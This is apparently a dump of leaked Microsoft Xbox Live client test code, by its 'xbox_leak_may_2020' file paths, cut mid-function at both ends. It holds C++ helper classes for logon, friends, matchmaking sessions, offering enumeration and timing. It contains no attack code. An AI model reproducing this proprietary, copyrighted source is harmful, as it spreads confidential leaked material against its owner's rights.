	return (XONLINE_S_NOTIFICATION_UPTODATE == m_hrLastResult);
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\FriendOpTask.h ===
// FriendOpTask.h: interface for the CFriendOpTask class.
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include "AsyncTask.h"

class CFriendOpTask : public CAsyncTask  
{
public:
	BOOL AnswerGameInvite(DWORD dwUserIndex, PXONLINE_FRIEND pToFriend, XONLINE_GAMEINVITE_ANSWER_TYPE Answer);
	BOOL RevokeGameInvite(DWORD dwUserIndex, XNKID SessionID, DWORD dwFriendsListCount, PXONLINE_FRIEND pToFriendList);
	BOOL GameInvite(DWORD dwUserIndex, XNKID SessionID, DWORD dwFriendListCount,  PXONLINE_FRIEND pToFriendList);
	BOOL StartTask();
	HRESULT TaskContinue();
	BOOL AnswerFriendRequest(DWORD dwUserIndex, PXONLINE_FRIEND pFriend, XONLINE_REQUEST_ANSWER_TYPE Answer);
	BOOL RemoveFriend(DWORD dwUserIndex, PXONLINE_FRIEND pFriend);
	BOOL RequestFriend(DWORD dwUserIndex, XUID xuidFriend);
	CFriendOpTask();
	virtual ~CFriendOpTask();

};
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\LogonTask.cpp ===
// LogonTask.cpp: implementation of the CLogonTask class.
//
//////////////////////////////////////////////////////////////////////

#include "LogonTask.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CLogonTask::CLogonTask()
{
	m_pUsersArray = new XONLINE_USER[XONLINE_MAX_STORED_ONLINE_USERS];
	memset(m_pUsersArray, 0, sizeof(XONLINE_USER) * XONLINE_MAX_STORED_ONLINE_USERS);
	memset(m_dwServices, 0, sizeof(m_dwServices));
	m_dwUsersCount = 0;
	m_dwServicesCount = 0;
	m_fDefaultUsers = TRUE;
}

CLogonTask::~CLogonTask()
{
	delete [] m_pUsersArray;
}

BOOL CLogonTask::StartTask()
{
	// If this object has been used for a previous logon task, clean up the old task first
	if(m_hTask)
	{
		XOnlineTaskClose(m_hTask);
		m_hTask = NULL;
	}

	// By default, just grab the first four users on the box and log in with them
	if(m_fDefaultUsers)
	{
		memset(m_pUsersArray, 0, sizeof(XONLINE_USER) * XONLINE_MAX_STORED_ONLINE_USERS);
		m_hrLastResult = XOnlineGetUsers(m_pUsersArray, &m_dwUsersCount);
		if (FAILED(m_hrLastResult))
		{
			LOGTASKINFOHR(m_hLog, "CLogonTask: Couldn't get users from harddrive", m_hrLastResult);
			return FALSE;
		}
	}


	// Start login
	m_hrLastResult = XOnlineLogon(m_pUsersArray, m_dwServicesCount ? m_dwServices : NULL, m_dwServicesCount, m_hWorkEvent, &m_hTask);
	if (FAILED(m_hrLastResult))
	{
		LOGTASKINFOHR(m_hLog, "CLogonTask: XOnlineLogon failed", m_hrLastResult);
        return FALSE;
	}

	// Mark the task as running so TaskContinue calls will be processed
	m_hrLastResult = XONLINETASK_S_RUNNING;

	return TRUE;
}

BOOL CLogonTask::SetServices(DWORD *pdwServices, DWORD dwServicesCount)
{
	if(dwServicesCount > MAX_LOGON_SERVICES)
		return FALSE;

	memcpy(m_dwServices, pdwServices, sizeof(DWORD) * dwServicesCount);

	m_dwServicesCount = dwServicesCount;

	return TRUE;
}

HRESULT CLogonTask::TaskContinue()
{
	// Only process this if the task hasn't already failed
	if(XONLINETASK_STATUS_AVAILABLE(m_hrLastResult) && (m_hrLastResult != XONLINE_S_LOGON_CONNECTION_ESTABLISHED))
		return m_hrLastResult;

	CAsyncTask::TaskContinue();

	// Only get the final result when the task first completes
	if(!XONLINETASK_STATUS_AVAILABLE(m_hrLastResult))
		return m_hrLastResult;

	return m_hrLastResult;
}

DWORD CLogonTask::GetUsersCount()
{
	DWORD dwUserIndex = 0;
	PXONLINE_USER pCurrUser = NULL;

	m_dwUsersCount = 0;
	for(dwUserIndex = 0,pCurrUser = XOnlineGetLogonUsers();((pCurrUser != NULL) && (dwUserIndex < XONLINE_MAX_LOGON_USERS)); ++pCurrUser, ++dwUserIndex)
	{
		if(pCurrUser->xuid.qwUserID != 0)
			++m_dwUsersCount;
	}

	return m_dwUsersCount;
}

BOOL CLogonTask::IsTaskComplete()
{
	return (XONLINETASK_STATUS_AVAILABLE(m_hrLastResult) && (m_hrLastResult != XONLINE_S_LOGON_CONNECTION_ESTABLISHED));
}

BOOL CLogonTask::IsConnectionEstablished()
{
	return (m_hrLastResult == XONLINE_S_LOGON_CONNECTION_ESTABLISHED);
}

BOOL CLogonTask::SetUsers(PXONLINE_USER pUsersArray)
{
	if(!pUsersArray)
		return FALSE;

	m_fDefaultUsers = FALSE;

	memcpy(m_pUsersArray, pUsersArray, sizeof(XONLINE_USER) * XONLINE_MAX_STORED_ONLINE_USERS);

	return TRUE;
}

void CLogonTask::UseDefaultUsers()
{
	m_fDefaultUsers = TRUE;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\MatchSearchTask.cpp ===
// MatchSearchTask.cpp: implementation of the CMatchSearchTask class.
//
//////////////////////////////////////////////////////////////////////

#include "MatchSearchTask.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMatchSearchTask::CMatchSearchTask()
{
	m_dwResultsCount = 10;
	m_dwResultsLen = 10 * (sizeof(XMATCH_SEARCHRESULT) + 100);
	m_dwProcedureIndex = 1;
	m_fFindFromSessionID = FALSE;
	memset(&m_SessionID, 0, sizeof(XNKID));
	m_pSearchAttributes = NULL;
	m_dwSearchAttributesCount = 0;
	m_rgpReturnedResults = NULL;
	m_dwReturnedResultsCount = 0;
	m_fResultsAvailable = FALSE;
}

CMatchSearchTask::~CMatchSearchTask()
{

}

BOOL CMatchSearchTask::StartTask()
{
	HRESULT hr = S_OK;

	// If this object has been used for a previous search task, clean up the old task first
	if(m_hTask)
	{
		XOnlineTaskClose(m_hTask);
		m_hTask = NULL;
	}

	if(m_fFindFromSessionID)
	{
		// Find from a sessionID
		m_hrLastResult = XOnlineMatchSessionFindFromID(m_SessionID, m_hWorkEvent, &m_hTask);

		if(FAILED(m_hrLastResult))
		{
			LOGTASKINFOHR(m_hLog, "CMatchSearchTask: XOnlineMatchSessionFindFromID failed", m_hrLastResult);
			return FALSE;
		}
	}
	else
	{
		// Create a search with attributes
		m_hrLastResult = XOnlineMatchSearch(m_dwProcedureIndex, m_dwResultsCount, m_dwSearchAttributesCount, m_pSearchAttributes, m_dwResultsLen, m_hWorkEvent, &m_hTask);

		if(FAILED(m_hrLastResult))
		{
			LOGTASKINFOHR(m_hLog, "CMatchSearchTask: XOnlineMatchSearch failed", m_hrLastResult);
			return FALSE;
		}
	}

	// Mark the task as running so TaskContinue calls will be processed
	m_hrLastResult = XONLINETASK_S_RUNNING;

	m_fResultsAvailable = FALSE;

	return TRUE;
}

HRESULT CMatchSearchTask::GetSearchResults(PXMATCH_SEARCHRESULT **prgpSearchResults, DWORD *pdwResultsCount)
{
	if(!m_fResultsAvailable)
	{
		m_hrLastResult = XOnlineMatchSearchGetResults(m_hTask, &m_rgpReturnedResults, &m_dwReturnedResultsCount);
		
		if(FAILED(m_hrLastResult))
			return m_hrLastResult;
	}
	
	if(prgpSearchResults)
		*prgpSearchResults = m_rgpReturnedResults;
	
	if(pdwResultsCount)
		*pdwResultsCount = m_dwReturnedResultsCount;

	return m_hrLastResult;
}

void CMatchSearchTask::SetSearchAttributes(PXONLINE_ATTRIBUTE pAttributes, DWORD dwAttributesCount)
{
	if(!pAttributes && (dwAttributesCount > 0))
		return;

	m_dwSearchAttributesCount = dwAttributesCount;
	m_pSearchAttributes = pAttributes;
}

void CMatchSearchTask::SetResultsSize(DWORD dwResultsCount, DWORD dwResultsLen)
{
	m_dwResultsCount = dwResultsCount;
	m_dwResultsLen = dwResultsLen;
}

void CMatchSearchTask::SetSessionIDForSearch(XNKID *pSessionID)
{
	if(!pSessionID)
		return;

	memcpy(&m_SessionID, pSessionID, sizeof(XNKID));

	m_fFindFromSessionID = TRUE;

	return;
}

void CMatchSearchTask::SetSearchProcIndex(DWORD dwProcIndex)
{
	m_dwProcedureIndex = dwProcIndex;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\FriendOpTask.cpp ===
// FriendOpTask.cpp: implementation of the CFriendOpTask class.
//
//////////////////////////////////////////////////////////////////////

#include "FriendOpTask.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CFriendOpTask::CFriendOpTask()
{

}

CFriendOpTask::~CFriendOpTask()
{

}

BOOL CFriendOpTask::RequestFriend(DWORD dwUserIndex, XUID xuidFriend)
{
	HRESULT hr = S_OK;

	m_hrLastResult = XOnlineFriendsRequest(dwUserIndex, xuidFriend);
	if(FAILED(m_hrLastResult))
	{
		LOGTASKINFOHR(m_hLog, "CFriendOpTask: XOnlineFriendsRequest failed", m_hrLastResult);
        return FALSE;
	}

	return TRUE;
}

BOOL CFriendOpTask::RemoveFriend(DWORD dwUserIndex, PXONLINE_FRIEND pFriend)
{
	HRESULT hr = S_OK;

	m_hrLastResult = XOnlineFriendsRemove(dwUserIndex, pFriend);
	if(FAILED(m_hrLastResult))
	{
		LOGTASKINFOHR(m_hLog, "CFriendOpTask: XOnlineFriendsRemove failed", m_hrLastResult);
        return FALSE;
	}

	return TRUE;
}

BOOL CFriendOpTask::AnswerFriendRequest(DWORD dwUserIndex, PXONLINE_FRIEND pFriend, XONLINE_REQUEST_ANSWER_TYPE Answer)
{
	HRESULT hr = S_OK;

	m_hrLastResult = XOnlineFriendsAnswerRequest(dwUserIndex, pFriend, Answer);
	if(FAILED(m_hrLastResult))
	{
		LOGTASKINFOHR(m_hLog, "CFriendOpTask: XOnlineFriendsAnswerRequest failed", m_hrLastResult);
        return FALSE;
	}

	return TRUE;
}

HRESULT CFriendOpTask::TaskContinue()
{
	CAsyncTask::TaskContinue();

	return m_hrLastResult;
}

BOOL CFriendOpTask::StartTask()
{
	HRESULT hr = S_OK;

	m_hrLastResult = XOnlineFriendsStartup(m_hWorkEvent, &m_hTask);
	if(FAILED(m_hrLastResult))
	{
		LOGTASKINFOHR(m_hLog, "CFriendOpTask: XOnlineFriendsStartup failed", m_hrLastResult);
        return FALSE;
	}

	// Mark the task as running so TaskContinue calls will be processed
	m_hrLastResult = XONLINETASK_S_RUNNING;

	return TRUE;
}

BOOL CFriendOpTask::GameInvite(DWORD dwUserIndex, XNKID SessionID, DWORD dwFriendListCount, PXONLINE_FRIEND pToFriendList)
{
	HRESULT hr = S_OK;

	m_hrLastResult = XOnlineFriendsGameInvite(dwUserIndex, SessionID, dwFriendListCount, pToFriendList);
	if(FAILED(m_hrLastResult))
	{
		LOGTASKINFOHR(m_hLog, "CFriendOpTask: XOnlineFriendsGameInvite failed", m_hrLastResult);
        return FALSE;
	}

	return TRUE;
}

BOOL CFriendOpTask::RevokeGameInvite(DWORD dwUserIndex, XNKID SessionID, DWORD dwFriendsListCount, PXONLINE_FRIEND pToFriendList)
{
	HRESULT hr = S_OK;

	m_hrLastResult = XOnlineFriendsRevokeGameInvite(dwUserIndex, SessionID, dwFriendsListCount, pToFriendList);
	if(FAILED(m_hrLastResult))
	{
		LOGTASKINFOHR(m_hLog, "CFriendOpTask: XOnlineFriendsRevokeGameInvite failed", m_hrLastResult);
        return FALSE;
	}

	return TRUE;
}

BOOL CFriendOpTask::AnswerGameInvite(DWORD dwUserIndex, PXONLINE_FRIEND pToFriend, XONLINE_GAMEINVITE_ANSWER_TYPE Answer)
{
	HRESULT hr = S_OK;

	m_hrLastResult = XOnlineFriendsAnswerGameInvite(dwUserIndex, pToFriend, Answer);
	if(FAILED(m_hrLastResult))
	{
		LOGTASKINFOHR(m_hLog, "CFriendOpTask: XOnlineFriendsAnswerRequest failed", m_hrLastResult);
        return FALSE;
	}

	return TRUE;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\MatchSessionCreateTask.cpp ===
// MatchSessionCreateTask.cpp: implementation of the CMatchSessionCreateTask class.
//
//////////////////////////////////////////////////////////////////////

#include "MatchSessionCreateTask.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMatchSessionCreateTask::CMatchSessionCreateTask()
{
	memset(&m_SessionID, 0, sizeof(m_SessionID));
	memset(&m_SessionKey, 0, sizeof(m_SessionKey));
	m_fSessionIDSet = FALSE;
	m_pAttributes = NULL;
	m_dwAttributesCount = 0;
	m_dwPublicAvailable = 0;
	m_dwPrivateAvailable = 0;
	m_dwPublicCurrent = 0;
	m_dwPrivateCurrent = 0;
	m_fDeleteSessionOnClose = TRUE;
	m_fSessionCreated = FALSE;
}

CMatchSessionCreateTask::~CMatchSessionCreateTask()
{
	COnlineTimer DeleteTimer;
	XONLINETASK_HANDLE hDeleteTask = NULL;
	HRESULT hr = S_OK;
	HANDLE hDeleteEvent = NULL;

	if(m_fSessionCreated && m_fDeleteSessionOnClose)
	{
		hDeleteEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

		if(!hDeleteEvent)
			goto Exit;

		hr = XOnlineMatchSessionDelete(m_SessionID, hDeleteEvent, &hDeleteTask);
		if(FAILED(hr))
			goto Exit;

		DeleteTimer.SetAllowedTime(10000);
		DeleteTimer.Start();

		// Pump task for 10 seconds
		do
		{
			if(DeleteTimer.HasTimeExpired())
				break;

			WaitForSingleObject(hDeleteEvent, DeleteTimer.GetTimeRemaining());

			hr = XOnlineTaskContinue(hDeleteTask);
		} while(!XONLINETASK_STATUS_AVAILABLE(hr));
		
		if(!XONLINETASK_STATUS_AVAILABLE(hr))
			goto Exit;		
	}

Exit:

	if(hDeleteTask)
		XOnlineTaskClose(hDeleteTask);

	if(hDeleteEvent)
		CloseHandle(hDeleteEvent);

	return;
}

BOOL CMatchSessionCreateTask::StartTask()
{
	HRESULT hr = S_OK;

	// If this object has been used for a previous match task, clean up the old task first
	if(m_hTask)
	{
		XOnlineTaskClose(m_hTask);
		m_hTask = NULL;
	}

	if(m_fSessionIDSet)
	{
		// Modify an existing session
		m_hrLastResult = XOnlineMatchSessionUpdate(m_SessionID, m_dwPublicCurrent, m_dwPublicAvailable, m_dwPrivateCurrent, m_dwPrivateAvailable, m_dwAttributesCount, m_pAttributes, m_hWorkEvent, &m_hTask);
		if(FAILED(m_hrLastResult))
		{
			LOGTASKINFOHR(m_hLog, "CMatchSessionCreateTask: XOnlineMatchSessionUpdate failed", m_hrLastResult);
			return FALSE;
		}
	}
	else
	{
		// Create a new session
		m_hrLastResult = XOnlineMatchSessionCreate(m_dwPublicCurrent, m_dwPublicAvailable, m_dwPrivateCurrent, m_dwPrivateAvailable, m_dwAttributesCount, m_pAttributes, m_hWorkEvent, &m_hTask);
		if(FAILED(m_hrLastResult))
		{
			LOGTASKINFOHR(m_hLog, "CMatchSessionCreateTask: XOnlineMatchSessionCreate failed", m_hrLastResult);
			return FALSE;
		}
	}

	// Mark the task as running so TaskContinue calls will be processed
	m_hrLastResult = XONLINETASK_S_RUNNING;

	return TRUE;
}

void CMatchSessionCreateTask::SetAttributes(PXONLINE_ATTRIBUTE pAttributes, DWORD dwAttributesCount)
{
	m_pAttributes = pAttributes;
	m_dwAttributesCount = dwAttributesCount;
}

HRESULT CMatchSessionCreateTask::TaskContinue()
{
	HRESULT hr = S_OK;

	// Only process this if the task hasn't already completed
	if(XONLINETASK_STATUS_AVAILABLE(m_hrLastResult))
		return m_hrLastResult;

	CAsyncTask::TaskContinue();

	// Only process this if the task hasn't already completed
	if(XONLINETASK_STATUS_AVAILABLE(m_hrLastResult))
	{
		if(FAILED(m_hrLastResult))
		{
			LOGTASKINFOHR(m_hLog, "CMatchSessionCreateTask: Session creation failed asynchronously", m_hrLastResult);
			return m_hrLastResult;
		}

		hr = XOnlineMatchSessionGetInfo(m_hTask, &m_SessionID, &m_SessionKey);
		if(hr != S_OK)
		{
			LOGTASKINFOHR(m_hLog, "CMatchSessionCreateTask: Failed getting session ID", m_hrLastResult);

			return m_hrLastResult;
		}

		m_fSessionIDSet = TRUE;
		m_fSessionCreated = TRUE;
	}

	return m_hrLastResult;
}

void CMatchSessionCreateTask::GetSessionInfo(XNKID *pSessionID, XNKEY *pSessionKey)
{
	if(pSessionID)
		memcpy(pSessionID, &m_SessionID, sizeof(XNKID));

	if(pSessionKey)
		memcpy(pSessionKey, &m_SessionKey, sizeof(XNKEY));
}

void CMatchSessionCreateTask::SetAvailableSlots(DWORD dwPublicCurrent, DWORD dwPublicAvailable, DWORD dwPrivateCurrent, DWORD dwPrivateAvailable)
{
	m_dwPublicCurrent = dwPublicCurrent;
	m_dwPrivateCurrent = dwPrivateCurrent;
	m_dwPublicAvailable = dwPublicAvailable;
	m_dwPrivateAvailable = dwPrivateAvailable;
}

void CMatchSessionCreateTask::SetSessionID(XNKID *pSessionID)
{
	if(pSessionID)
	{
		memcpy(&m_SessionID, pSessionID, sizeof(m_SessionID));

		// If the session ID is non-zero, then the match operation will be an
		// update of an existing session
		for(WORD i = 0; i < sizeof(pSessionID->ab) / sizeof(BYTE); i++)
		{
			if(pSessionID->ab[i])
				break;
		}
		
		// If this is true, we have a session update
		if(i < sizeof(pSessionID->ab) / sizeof(BYTE))
		{
			m_fSessionIDSet = TRUE;
		}
		else
		{
			m_fSessionIDSet = FALSE;
		}
	}
}

void CMatchSessionCreateTask::KeepSessionAfterClose()
{
	m_fDeleteSessionOnClose = FALSE;
}

BOOL CMatchSessionCreateTask::IsSessionCreated()
{
	return m_fSessionCreated;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\MatchSessionCreateTask.h ===
// MatchSessionCreateTask.h: interface for the CMatchSessionCreateTask class.
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include "AsyncTask.h"
#include "OnlineTimer.h"

class CMatchSessionCreateTask : public CAsyncTask  
{
public:
	BOOL IsSessionCreated();
	void KeepSessionAfterClose();
	void SetSessionID(XNKID *pSessionID);
	void SetAvailableSlots(DWORD dwPublicCurrent, DWORD dwPublicAvailable, DWORD dwPrivateCurrent, DWORD dwPrivateAvailable);
	void GetSessionInfo(XNKID *pSessionID, XNKEY *pSessionKey);
	HRESULT TaskContinue();
	void SetAttributes(PXONLINE_ATTRIBUTE pAttributes, DWORD dwAttributesCount);
	BOOL StartTask();
	CMatchSessionCreateTask();
	virtual ~CMatchSessionCreateTask();

protected:
	BOOL m_fSessionCreated;
	BOOL m_fDeleteSessionOnClose;
	DWORD m_dwPrivateCurrent;
	DWORD m_dwPublicCurrent;
	DWORD m_dwPrivateAvailable;
	DWORD m_dwPublicAvailable;
	DWORD m_dwAttributesCount;
	PXONLINE_ATTRIBUTE m_pAttributes;
	BOOL m_fSessionIDSet;
	XNKID m_SessionID;
	XNKEY m_SessionKey;
};
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\LogonTask.h ===
// LogonTask.h: interface for the CLogonTask class.
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include "AsyncTask.h"

#define MAX_LOGON_SERVICES 10

class CLogonTask : public CAsyncTask  
{
public:
	void UseDefaultUsers();
	BOOL SetUsers(PXONLINE_USER pUsersArray);
	BOOL IsConnectionEstablished();
	BOOL IsTaskComplete();
	DWORD GetUsersCount();
	HRESULT TaskContinue();
	BOOL SetServices(DWORD *paServices, DWORD dwServicesCount);
	BOOL StartTask();
	CLogonTask();
	virtual ~CLogonTask();

protected:
	DWORD m_dwServicesCount;
	DWORD m_dwServices[MAX_LOGON_SERVICES];
	DWORD m_dwUsersCount;
	XONLINE_USER *m_pUsersArray;
private:
	BOOL m_fDefaultUsers;
};
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\MatchSearchTask.h ===
// MatchSearchTask.h: interface for the CMatchSearchTask class.
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include "AsyncTask.h"

class CMatchSearchTask : public CAsyncTask  
{
public:
	void SetSearchProcIndex(DWORD dwProcIndex);
	void SetSessionIDForSearch(XNKID *pSessionID);
	void SetResultsSize(DWORD dwResultsCount, DWORD dwResultsLen);
	void SetSearchAttributes(PXONLINE_ATTRIBUTE pAttributes, DWORD dwAttributesCount);
	HRESULT GetSearchResults(PXMATCH_SEARCHRESULT **prgpSearchResults, DWORD *pdwResultsCount);
	BOOL StartTask();
	CMatchSearchTask();
	virtual ~CMatchSearchTask();

protected:
	BOOL m_fResultsAvailable;
	PXMATCH_SEARCHRESULT *m_rgpReturnedResults;
	DWORD m_dwReturnedResultsCount;
	XNKID m_SessionID;
	BOOL m_fFindFromSessionID;
	DWORD m_dwResultsLen;
	DWORD m_dwResultsCount;
	DWORD m_dwProcedureIndex;
	DWORD m_dwSearchAttributesCount;
	PXONLINE_ATTRIBUTE m_pSearchAttributes;
};
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\OnlineTimer.h ===
// OnlineTimer.h: interface for the COnlineTimer class.
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include <xtl.h>

class COnlineTimer  
{
public:
	void SetAllowedTime(DWORD dwAllowedTime);
	DWORD GetTimeRemaining();
	void Start();
	BOOL HasTimeExpired();
	COnlineTimer::COnlineTimer(const COnlineTimer &);
	COnlineTimer();
	virtual ~COnlineTimer();
protected:
	DWORD m_dwAllowedTime;
	DWORD m_dwStartTick;
	DWORD m_dwLastTick;
	BOOL m_fStarted;
};
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\OnlineTimer.cpp ===
// OnlineTimer.cpp: implementation of the COnlineTimer class.
//
//////////////////////////////////////////////////////////////////////

#include "OnlineTimer.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

COnlineTimer::COnlineTimer()
{
	m_dwAllowedTime = 0;
	m_dwStartTick = 0;
	m_dwLastTick = 0;
	m_fStarted = FALSE;
}

COnlineTimer::~COnlineTimer()
{

}

COnlineTimer::COnlineTimer(const COnlineTimer &OnlineTimer)
{
	m_dwAllowedTime = OnlineTimer.m_dwAllowedTime;
	m_dwLastTick = OnlineTimer.m_dwLastTick;
	m_dwStartTick = OnlineTimer.m_dwStartTick;
	m_fStarted = OnlineTimer.m_fStarted;
}

COnlineTimer& COnlineTimer::operator = (const COnlineTimer& OnlineTimer)
{
	m_dwAllowedTime = OnlineTimer.m_dwAllowedTime;
	m_dwLastTick = OnlineTimer.m_dwLastTick;
	m_dwStartTick = OnlineTimer.m_dwStartTick;
	m_fStarted = OnlineTimer.m_fStarted;

	return *this;
}

DWORD COnlineTimer::GetTimeRemaining()
{
	DWORD dwElapsedTime = 0;

	// If the timer was was never called, then always return
	// that there is 0 time remaining
	if(!m_fStarted)
		return 0;

	m_dwLastTick = GetTickCount();

	if(m_dwLastTick < m_dwStartTick)
	{
		// Handle tick wraparound
		dwElapsedTime = MAXDWORD - m_dwStartTick + m_dwLastTick;
	}
	else
	{
		dwElapsedTime = m_dwLastTick - m_dwStartTick;
	}

	if(dwElapsedTime > m_dwAllowedTime)
		return 0;

	return m_dwAllowedTime - dwElapsedTime;
}

BOOL COnlineTimer::HasTimeExpired()
{
	return (GetTimeRemaining() == 0);	
}

void COnlineTimer::Start()
{
	m_fStarted = TRUE;
	m_dwStartTick = GetTickCount();
}

void COnlineTimer::SetAllowedTime(DWORD dwAllowedTime)
{
	m_dwAllowedTime = dwAllowedTime;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\OfferingEnumerateTask.h ===
// OfferingEnumerateTask.h: interface for the COfferingEnumerate class.
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include "AsyncTask.h"

class COfferingEnumerateTask : public CAsyncTask 
{
public:
	void SetEnumParams(PXONLINEOFFERING_ENUM_PARAMS pEnumParams);
	void SetUserIndex(DWORD dwUserIndex);
	void SetTitleSpecificDataMaxSize(DWORD dwTitleSpecificDataMaxSize);
	HRESULT GetResults(PXONLINEOFFERING_INFO **prgpOfferingInfo, DWORD *pdwReturnedResults, BOOL *pfMoreResults);
	BOOL StartTask();
	COfferingEnumerateTask();
	virtual ~COfferingEnumerateTask();

protected:
	DWORD m_dwTitleSpecificDataMaxSize;
	XONLINEOFFERING_ENUM_PARAMS m_EnumParams;
	DWORD m_dwUserIndex;
};
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\feedback\feedback.h ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       feedback.h
 *  Content:    feedback utility interface
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *   2/21/01    davidhef Created to test Xbox feedback
 *
 ****************************************************************************/

#pragma once

#include <xtl.h>
#include <xdbg.h>
#include <xtestlib.h>
#include <xlog.h>
#include <macros.h>
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\OfferingEnumerateTask.cpp ===
// OfferingEnumerateTask.cpp: implementation of the COfferingEnumerate class.
//
//////////////////////////////////////////////////////////////////////

#include "OfferingEnumerateTask.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

COfferingEnumerateTask::COfferingEnumerateTask()
{
	SYSTEMTIME st;

	st.wYear = 2000;
	st.wMonth = 1;
	st.wDay = 1;
	st.wDayOfWeek = 6;
	st.wHour = 0;
	st.wMinute = 0;
	st.wSecond = 0;
	st.wMilliseconds = 0;
	SystemTimeToFileTime(&st, &(m_EnumParams.ftActiveAfter));
	m_EnumParams.dwOfferingType = 0xffffffff;
	m_EnumParams.dwBitFilter = 0xffffffff;
	m_EnumParams.dwMaxResults = 10;
	m_EnumParams.dwDescriptionIndex = 0;

	m_dwUserIndex = 0;
	m_dwTitleSpecificDataMaxSize = 0;
}

COfferingEnumerateTask::~COfferingEnumerateTask()
{

}

BOOL COfferingEnumerateTask::StartTask()
{
	DWORD dwRequiredBufferSize = 0;

	// If this object has been used for a previous enumeration task, clean up the old task first
	if(m_hTask)
	{
		XOnlineTaskClose(m_hTask);
		m_hTask = NULL;
	}
	
	dwRequiredBufferSize = XOnlineOfferingEnumerateMaxSize(&m_EnumParams, m_dwTitleSpecificDataMaxSize);

	m_hrLastResult = XOnlineOfferingEnumerate(XONLINEOFFERING_ENUM_DEVICE_ONLINE, 0, &m_EnumParams, NULL, dwRequiredBufferSize, m_hWorkEvent, &m_hTask);
	if(FAILED(m_hrLastResult))
	{
		LOGTASKINFOHR(m_hLog, "COfferingEnumerate: XOnlineOfferingEnumerate failed", m_hrLastResult);
		return FALSE;
	}

	// Mark the task as running so TaskContinue calls will be processed
	m_hrLastResult = XONLINETASK_S_RUNNING;

	return TRUE;
}

HRESULT COfferingEnumerateTask::GetResults(PXONLINEOFFERING_INFO **prgpOfferingInfo, DWORD *pdwReturnedResults, BOOL *pfMoreResults)
{
	return XOnlineOfferingEnumerateGetResults(m_hTask, prgpOfferingInfo, pdwReturnedResults, pfMoreResults);
}

void COfferingEnumerateTask::SetTitleSpecificDataMaxSize(DWORD dwTitleSpecificDataMaxSize)
{
	m_dwTitleSpecificDataMaxSize = dwTitleSpecificDataMaxSize;
}

void COfferingEnumerateTask::SetUserIndex(DWORD dwUserIndex)
{
	m_dwUserIndex = dwUserIndex;
}

void COfferingEnumerateTask::SetEnumParams(PXONLINEOFFERING_ENUM_PARAMS pEnumParams)
{
	if(!pEnumParams)
		return;

	memcpy(&m_EnumParams, pEnumParams, sizeof(XONLINEOFFERING_ENUM_PARAMS));
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\feedback\feedback.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       feedback.cpp
 *  Content:    feedback tests
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *   2/21/01    davidhef Created to test Xbox feedback
 *
 ****************************************************************************/

#include "feedback.h"
#include <xonlinep.h>
#include <XOnline.h>
#include <XOnlineAuthUtil.h>
#include <CXLiveConnectionManager.h>
#include <CXLiveUserManager.h>

using XLive::CXLiveUserManager;
using XLive::CXLiveConnectionManager;
using XLive::CXLiveUserManager::const_AccountIterator;

/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

extern HANDLE g_hLog;

/****************************************************************************
 *
 *  feedback_BasicTest
 *
 *  Description:
 *      Basic Test for feedback
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT feedback_BasicTest( void )
{
    HRESULT             hr              = S_OK;
    LPCWSTR             pwszNickname = L"SuperSquirrel";
    XONLINETASK_HANDLE  phTask = NULL;
    bool    bNetworkStarted = false;
    bool    bLoggedOn = false;
    
    if (SUCCEEDED(hr))
    {
        hr = StartNetwork();
        bNetworkStarted = (S_OK == hr) ? true : false;
    }
    
    CXLiveUserManager userMgr;
